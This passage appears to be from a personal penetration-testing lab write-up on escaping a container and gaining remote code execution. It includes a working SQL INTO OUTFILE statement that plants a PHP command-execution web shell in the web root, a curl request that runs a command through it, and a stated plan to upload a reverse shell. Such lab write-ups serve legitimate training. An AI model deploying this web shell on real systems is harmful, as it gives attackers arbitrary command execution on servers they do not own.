
Now there are several ways to escape a container, all typically stemming from misconfigurations of the container from services or access controls.

[https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)

This is the code that will help us to create or can see help us to inject our php code that we can trigger to get the RCE vulnerability.

```sql
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

![[Pasted image 20240215205743.png]]

```bash
curl 192.168.100.1:8080/shell.php?cmd=whoami
```

![[Pasted image 20240219000458.png]]
this means that the code is inserted successfully in the database and we can access it through the curl command that means we have to upload a reverse shell (i.e. bash in our case and will try to trigger it and get a shell from it)


